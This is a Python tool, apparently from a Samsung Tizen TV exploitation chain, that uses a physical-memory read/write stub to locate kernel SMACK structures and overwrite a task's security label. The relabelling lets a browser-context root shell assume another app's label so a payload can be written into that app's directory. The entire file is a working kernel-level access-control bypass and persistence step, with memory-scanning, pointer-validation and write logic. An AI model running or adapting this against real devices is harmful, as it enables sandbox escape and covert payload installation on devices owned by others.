"""Relabel the stub's kernel task to another SMACK label (physmap, RAM-only).

Why: the app lane is one-way from a stock TV - the browser-labelled root shell
cannot write the app's `bin/`, and the shipped SMACK policy grants no cross-app
access at all (only `System*`, `User`, `User::Shell` and `_` have rules for
`User::Home`; see etc/smack/accesses.d). To put the payload back we must BE the
app label. The app directory is `User::Home` with transmute=TRUE, so files we
create while carrying the app label inherit it - no chsmack needed.

How (all read-verify-then-write):
  1. locate `struct smack_known` entries: scan for the label string, find the
     pointer to it (`smk_known` is at offset 8), validate the list_head, then
     walk `smack_known_list` to map every label name -> smack_known address;
  2. find our task's `task_smack` (task->security): a field in task_struct that
     points at a pair of pointers both inside the smack_known set, the first
     being our current label (from /proc/self/attr/current, passed in);
  3. write new `smk_task` / `smk_forked` = the target smack_known.

The stub (RPC thread) is relabelled, so a following op 7 shell inherits it - and
`op 7` is one-shot, so this must be the last thing before the deploy.

Usage:
  python tools/smack_relabel.py --dry-run            # locate + validate only
  python tools/smack_relabel.py --apply              # write the pointers
  python tools/smack_relabel.py --apply --target User::Pkg::com.samsung.tv.MultiControl-Service
"""
import argparse
import struct
import sys
import time
from pathlib import Path

TOOLS = str(Path(__file__).resolve().parent)
sys.path.insert(0, TOOLS)

import physmap as T          # noqa: E402
import kernel_root as K      # noqa: E402

INIT_V, INIT_P = 0xC0957180, 0x20957180
OFF = 0x23C
V = 0xA0000000
SCAN_LO, SCAN_HI = 0x20000000, 0x40000000
# task_structs are sometimes allocated above the cred-scan window; reads past
# 0x46000000 are known to hang the stub, so stop 1 MB below it.
TAG_SCAN_LO, TAG_SCAN_HI = 0x20000000, 0x45F00000
CUR_LABEL = "User::Pkg::org.tizen.browser"
TARGET_LABEL = "User::Pkg::com.samsung.tv.MultiControl-Service"
# cred->security (cred+0x64) is a task_smack: { smk_task, smk_forked, list_head }
CRED_SECURITY = 0x64


def sane_smack_blob(rpc, blob):
    """Return (smk_task, smk_forked) if `blob` looks like a task_smack, else None.

    A real one holds two kernel label pointers and a self-referential list_head
    at +8; anything else (a random cred field, ASCII) is rejected before use.
    """
    if not T._kernel_ptr(blob):
        return None
    try:
        smk = rpc.read_u32(phys(blob))
        fk = rpc.read_u32(phys(blob) + 4)
        nxt, prv = struct.unpack("<2I", rpc.read(phys(blob) + 8, 8))
    except Exception:
        return None
    if not (T._kernel_ptr(smk) and T._kernel_ptr(fk)):
        return None
    want = (blob + 8) & 0xFFFFFFFF
    if nxt != want or prv != want:
        return None
    return smk, fk


def phys(va):
    return (va - V) & 0xFFFFFFFF


def va(ph):
    return (ph + V) & 0xFFFFFFFF


def cstr(rpc, ph, n=64):
    try:
        b = rpc.read(ph, n)
    except Exception:
        return ""
    z = b.find(b"\x00")
    return b[:z if z >= 0 else n].decode("latin-1", "replace")


def find_string(rpc, needle, lo=SCAN_LO, hi=SCAN_HI):
    """Physical address of the first occurrence of needle's bytes."""
    pat = needle.encode()
    page = lo
    while page < hi:
        count = min(4096, (hi - page) // 0x1000)
        for p, data in rpc.readmany(page, count):
            if data is None:
                continue
            i = data.find(pat)
            if i >= 0:
                return p + i
        page += count * 0x1000
    return None


def find_ptrs_to(rpc, target_phys, lo=SCAN_LO, hi=SCAN_HI):
    """Every physical address holding the u32 value va(target_phys)."""
    want = struct.pack("<I", va(target_phys))
    out = []
    page = lo
    while page < hi:
        count = min(4096, (hi - page) // 0x1000)
        for p, data in rpc.readmany(page, count):
            if data is None:
                continue
            i = data.find(want)
            while i >= 0:
                out.append(p + i)
                i = data.find(want, i + 1)
        page += count * 0x1000
    return out


def known_base_at(rpc, name_phys):
    """Resolve the smack_known struct whose smk_known field points at name_phys."""
    want_name = cstr(rpc, name_phys, 64)
    for a in find_ptrs_to(rpc, name_phys):
        base = (a - 8) & 0xFFFFFFFF
        try:
            nxt = T.u32(rpc.read(base, 4))
            prv = T.u32(rpc.read(base + 4, 4))
        except Exception:
            continue
        if not (T._kernel_ptr(nxt) and T._kernel_ptr(prv)):
            continue
        name = cstr(rpc, name_phys, 64)
        if not name or name != want_name:
            continue
        return base, name
    return None, None


def walk_knowns(rpc, base, limit=600):
    """{label -> smack_known phys} by walking the list from `base`."""
    out = {}
    seen = set()
    cur = base
    for _ in range(limit):
        if cur in seen:
            break
        seen.add(cur)
        try:
            nxt = T.u32(rpc.read(cur, 4))
            namep = T.u32(rpc.read(cur + 8, 4))
        except Exception:
            break
        if not T._kernel_ptr(namep):
            break
        name = cstr(rpc, phys(namep), 64)
        if name:
            out.setdefault(name, cur)
        if not T._kernel_ptr(nxt):
            break
        cur = phys(nxt)
    return out


def find_stub_task(rpc, exclude):
    """Fork once; the child's real_parent is the forking (RPC) thread.

    After fork() our child is inserted at the tail, i.e. init.tasks.prev *is* the
    child's list_head - no chain following needed.  The head read is retried a
    few times because the list update can lag the fork return.
    """
    pid = K._fork_pid(rpc)
    if pid <= 0:
        return None
    for attempt in range(6):
        time.sleep(0.08 if attempt else 0)
        try:
            head = rpc.read_u32(INIT_P + OFF + 4)
        except Exception:
            time.sleep(0.15)
            continue
        if not T._kernel_ptr(head):
            continue
        task = (head - OFF) & 0xFFFFFFFF
        try:
            comm = rpc.read(K.PHYS(task) + K.O_COMM, 16).split(bytes([0]))[0]
        except Exception:
            continue
        if comm.startswith(b"PHYRFORK") and task not in exclude:
            print(f"[+] child at init.tasks.prev = {T.hexs(task)} (attempt {attempt + 1})",
                  flush=True)
            return task
    # last resort: a few hops back, in case another task landed on top of ours
    try:
        cur = rpc.read_u32(INIT_P + OFF + 4)
    except Exception:
        return None
    for i in range(12):
        if not T._kernel_ptr(cur):
            break
        t = (cur - OFF) & 0xFFFFFFFF
        try:
            comm = rpc.read(K.PHYS(t) + K.O_COMM, 16).split(bytes([0]))[0]
        except Exception:
            break
        if comm.startswith(b"PHYRFORK") and t not in exclude:
            print(f"[+] child found {i} hop(s) from the head: {T.hexs(t)}", flush=True)
            return t
        try:
            cur = rpc.read_u32(K.PHYS(cur) + 4)
        except Exception:
            break
    return None


def find_task_smack(rpc, task, knowns, want_label):
    """Offset of task->security whose smk_task is `want_label`."""
    want = knowns.get(want_label)
    if not want:
        return None, None
    buf = rpc.read(phys(task), 0x900)
    for o in range(0, 0x900 - 4, 4):
        p = T.u32(buf, o)
        if not T._kernel_ptr(p):
            continue
        try:
            smk_task = T.u32(rpc.read(phys(p), 4))
            smk_forked = T.u32(rpc.read(phys(p) + 4, 4))
        except Exception:
            continue
        if phys(smk_task) == want and 0xC0000000 <= smk_forked <= 0xFFFFFFFF:
            # both must be known labels
            if phys(smk_forked) in knowns.values():
                return o, p
    return None, None


def find_task_smack_by_name(rpc, task, cur_label):
    """Locate task->security by matching the label string, and return it.

    task_smack = { smk_task, smk_forked, ... } and smack_known has
    `char *smk_known` at +8.  So: for each pointer field of the task, treat it
    as task_smack, read smk_task, then smk_task+8 -> name string.  Matching the
    *string* is what makes this safe - no scanning, no guessing.
    """
    buf = rpc.read(phys(task), 0xA00)
    found = []
    for o in range(0, 0xA00 - 4, 4):
        p = T.u32(buf, o)
        if not T._kernel_ptr(p):
            continue
        try:
            smk_task = T.u32(rpc.read(phys(p), 4))
            smk_forked = T.u32(rpc.read(phys(p) + 4, 4))
        except Exception:
            continue
        if not (T._kernel_ptr(smk_task) and T._kernel_ptr(smk_forked)):
            continue
        try:
            namep = T.u32(rpc.read(phys(smk_task) + 8, 4))
        except Exception:
            continue
        if not T._kernel_ptr(namep):
            continue
        if cstr(rpc, phys(namep), 64) != cur_label:
            continue
        found.append((o, p, smk_task, smk_forked))
    return found


def walk_from(rpc, known, limit=800):
    """{label -> smack_known phys}, walking the smack_known list from `known`."""
    out = {}
    cur = known
    seen = set()
    for _ in range(limit):
        if cur in seen:
            break
        seen.add(cur)
        try:
            nxt = T.u32(rpc.read(cur, 4))
            namep = T.u32(rpc.read(cur + 8, 4))
        except Exception:
            break
        name = cstr(rpc, phys(namep), 64) if T._kernel_ptr(namep) else ""
        if name:
            out.setdefault(name, cur)
        if not T._kernel_ptr(nxt):
            break
        cur = phys(nxt)
    return out


def sanity(rpc, tag=b"swapper"):
    """True if the stream is still in sync (init_task's comm is a known string).

    Long `readmany` scans abort on unmappable pages and can leave stray bytes on
    the socket; after that every read returns a garbage status and a scan looks
    like a negative result.  Checking a known address before trusting a batch
    turns that silent failure into an explicit one.
    """
    try:
        return rpc.read(INIT_P + K.O_COMM, 7).startswith(tag)
    except Exception:
        return False


def find_child_by_head(rpc, exclude, hops=12):
    """Cheap path: after fork our child is the newest task, i.e. init.tasks.prev.

    No chain following unless the head itself fails to validate, which keeps this
    usable even when the list is damaged a few hops in.
    """
    cur = rpc.read_u32(INIT_P + OFF + 4)
    for _ in range(hops):
        if not T._kernel_ptr(cur):
            return None
        t = (cur - OFF) & 0xFFFFFFFF
        try:
            comm = rpc.read(K.PHYS(t) + K.O_COMM, 16).split(bytes([0]))[0]
        except Exception:
            return None
        if comm.startswith(b"PHYRFORK") and t not in exclude:
            return t
        try:
            cur = rpc.read_u32(K.PHYS(cur) + 4)
        except Exception:
            return None
    return None


def find_tasks_by_tag_scan(rpc, tag=b"PHYSRPC1\x00", lo=TAG_SCAN_LO, hi=TAG_SCAN_HI):
    """List-independent: physical scan for the stub's comm tag.

    The task list is regularly unusable on this kernel, so when the fork/child
    walk fails we find candidate task_structs directly (tag at task+0x400) and
    let the label match in find_task_smack_by_name() pick the right one.
    """
    out = []
    page = lo
    batches = 0
    while page < hi:
        count = min(4096, (hi - page) // 0x1000)
        for p, data in rpc.readmany(page, count):
            if data is None:
                continue
            i = data.find(tag)
            while i >= 0:
                task = (p + i - K.O_COMM) & 0xFFFFFFFF
                try:
                    comm = rpc.read(task + K.O_COMM, 16).split(bytes([0]))[0]
                    cred = rpc.read_u32(task + K.O_CRED)
                except Exception:
                    comm, cred = b"", 0
                if comm == tag[:-1] and T._kernel_ptr(cred):
                    out.append(task)
                i = data.find(tag, i + 1)
        page += count * 0x1000
        batches += 1
        if batches % 8 == 0:
            if not sanity(rpc):
                raise RuntimeError("stub stream desynced during the scan - "
                                   "reload the page and retry on a fresh stub")
            print(f"    ... scanned to {T.hexs(page)}, {len(out)} candidate(s)",
                  flush=True)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--apply", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--scan", action="store_true",
                    help="allow the 600 MB comm-tag scan fallback (it can desync the stub)")
    ap.add_argument("--cur", default=CUR_LABEL)
    ap.add_argument("--target", default=TARGET_LABEL)
    args = ap.parse_args()

    rpc = T.RPC(timeout=25)
    try:
        if not sanity(rpc):
            print("DESYNCED_STUB: init_task.comm did not read back - reload the page "
                  "and run on a fresh stub (a desynced socket makes every result "
                  "meaningless)", flush=True)
            return 9
        print("[*] forking once to identify the RPC thread ...", flush=True)
        excl = K._tagged_near_tail(rpc, INIT_P, INIT_V, OFF, b"PHYRFORK", 40)
        child = find_stub_task(rpc, excl)
        if child:
            stub_task = rpc.read_u32(K.PHYS(child) + 0x2F0)
            print(f"[+] child {T.hexs(child)} -> real_parent (RPC thread) "
                  f"{T.hexs(stub_task)}", flush=True)
            tasks = [stub_task]
        else:
            if not args.scan:
                print("[!] could not locate the forked child (head + 12 hops). "
                      "Refusing the 600 MB scan without --scan: it desyncs the stub "
                      "and turns into a false negative. Reload the page and retry.",
                      flush=True)
                return 6
            print("[!] child not found - running the comm-tag scan "
                  "(--scan given; may desync)", flush=True)
            tasks = find_tasks_by_tag_scan(rpc)
            print(f"[*] {len(tasks)} PHYSRPC1 candidate task(s): "
                  f"{[T.hexs(t) for t in tasks][:8]}", flush=True)
            if not tasks:
                print("NO_TASK (tag scan found nothing)", flush=True)
                return 6

        picked = None
        for t in tasks:
            cands = find_task_smack_by_name(rpc, t, args.cur)
            if cands:
                picked = (t, cands)
                break
        if not picked:
            print(f"TASK_SMACK_NOT_FOUND (no candidate task points at a label named "
                  f"{args.cur!r})", flush=True)
            return 7
        stub_task, cands = picked
        print(f"[+] task {T.hexs(stub_task)} carries our label", flush=True)
        if len(cands) > 1:
            print(f"[!] {len(cands)} candidate security fields: "
                  f"{[(hex(o), T.hexs(p)) for o, p, _, _ in cands]}", flush=True)
        off, blob, smk_task, smk_forked = cands[0]
        print(f"[+] task->security +{off:#x} = {T.hexs(blob)} "
              f"(smk_task={T.hexs(smk_task)} smk_forked={T.hexs(smk_forked)})", flush=True)

        knowns = walk_from(rpc, phys(smk_task))
        print(f"[+] walked {len(knowns)} labels from our own smack_known", flush=True)
        if args.target not in knowns:
            print(f"TARGET_LABEL_NOT_IN_LIST ({args.target})", flush=True)
            print(f"    have: {sorted(knowns)[:10]} ...", flush=True)
            return 4
        target = knowns[args.target]
        print(f"[+] target {args.target!r} -> smack_known {T.hexs(target)}", flush=True)

        if not args.apply:
            print("[*] dry run - nothing written", flush=True)
            return 0

        for delta in (0, 4):
            st = rpc.write32(phys(blob) + delta, va(target))
            print(f"[{'*' if st == 0 else '!'}] smk_task+{delta} <- "
                  f"{T.hexs(va(target))} (status {st})", flush=True)
        got = struct.unpack("<2I", rpc.read(phys(blob), 8))
        ok = all(phys(g) == target for g in got)
        print(f"[{'*' if ok else '!'}] readback {[T.hexs(g) for g in got]} -> "
              f"{'RELABELLED' if ok else 'MISMATCH'}", flush=True)
        print("NEXT: op7 'cat /proc/self/attr/current' should print the target "
              "label; then run deploy.sh from that shell (server.py renders it)", flush=True)
        return 0 if ok else 8
    finally:
        rpc.close()


if __name__ == "__main__":
    sys.exit(main())
